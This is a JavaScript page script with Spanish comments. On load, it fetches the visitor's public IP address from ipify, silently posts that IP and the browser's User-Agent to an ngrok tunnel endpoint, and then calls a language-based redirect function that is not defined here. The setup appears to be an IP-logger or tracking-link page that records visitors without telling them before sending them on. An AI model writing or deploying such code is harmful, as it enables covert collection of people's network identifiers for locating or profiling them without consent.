document.addEventListener("DOMContentLoaded", function () {
  // Función para obtener la dirección IP pública del usuario
  async function getUserIP() {
    try {
      // Llamada a un servicio externo para obtener la IP pública del usuario
      const response = await fetch("https://api.ipify.org?format=json");
      if (!response.ok) {
        throw new Error(`Error al obtener la IP: ${response.statusText}`);
      }
      const data = await response.json();
      console.log("IP obtenida:", data.ip);
      return data.ip;
    } catch (error) {
      console.error("Error al obtener la IP:", error);
      return null;
    }
  }

  // Función para enviar la IP y el User-Agent al servidor
  async function sendIPAndBrowserToServer(ip, userAgent) {
    // URL del servidor
    const serverUrl = "https://driving-driving-possum.ngrok-free.app/info";

    try {
      // Realiza una solicitud POST con la IP y el User-Agent como carga útil
      const response = await fetch(serverUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          ip: ip,
          userAgent: userAgent,
        }),
      });

      // Verifica si la respuesta es correcta
      if (response.ok) {
        const data = await response.json();
        console.log("Datos enviados con éxito:", data);
      } else {
        console.error("Error al enviar datos:", response.statusText);
      }
    } catch (error) {
      console.error("Error al enviar datos:", error);
    }
  }

  // Función para ejecutar otros scripts después de que sendIPAndBrowserToServer termine
  function ejecutarAccionesAdicionales() {
    // Redirigir cuando la página cargue
      redirigirSegunIdioma();
  }

  // Obtener la IP pública del usuario y el User-Agent (información del navegador)
  getUserIP().then((ip) => {
    if (ip) {
      const userAgent = navigator.userAgent; // Obtener el User-Agent del navegador
      sendIPAndBrowserToServer(ip, userAgent).then(() => {
        // Una vez que sendIPAndBrowserToServer termine, ejecutar otros scripts
        ejecutarAccionesAdicionales();
      });
    } else {
      console.log("No se pudo obtener la conexion");
    }
  });
});
